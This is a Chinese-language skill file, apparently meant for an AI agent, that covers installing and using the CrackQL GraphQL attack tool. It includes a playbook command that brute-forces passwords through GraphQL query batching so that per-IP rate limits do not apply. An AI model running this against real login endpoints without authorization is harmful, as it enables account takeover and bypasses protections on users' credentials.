---
name: crackql-graphql-batch
description: 渗透工具 skill:CrackQL 的安装、参数速查与攻击场景 playbook。当任务涉及 API与GraphQL攻击 需要调用 CrackQL 时使用。
when-to-use: 渗透工具 skill:CrackQL 的安装、参数速查与攻击场景 playbook。当任务涉及 API与GraphQL攻击 需要调用 CrackQL 时使用。
---

# CrackQL

- 攻击大类:C10 API与GraphQL攻击
- 上游仓库:https://github.com/nicholasaleks/CrackQL
- 上游 License:BSD-3-Clause(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/nicholasaleks/CrackQL && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python CrackQL.py -t https://t.com/graphql -q query.graphql -w wordlist.txt` | GraphQL 批量查询/爆破 |
| `-v` | 详细 |
| `-o out.txt` | 输出 |

## 攻击场景 Playbook

### GraphQL 批量注入/爆破

```bash
python CrackQL.py -t https://api.t.com/graphql -q login.graphql -w passwords.txt
# 一次请求批量试密码,绕过单 IP 限速
```

## 注意事项

利用 GraphQL 批量请求特性(batching)做认证爆破/注入,请求合并绕过频率限制。
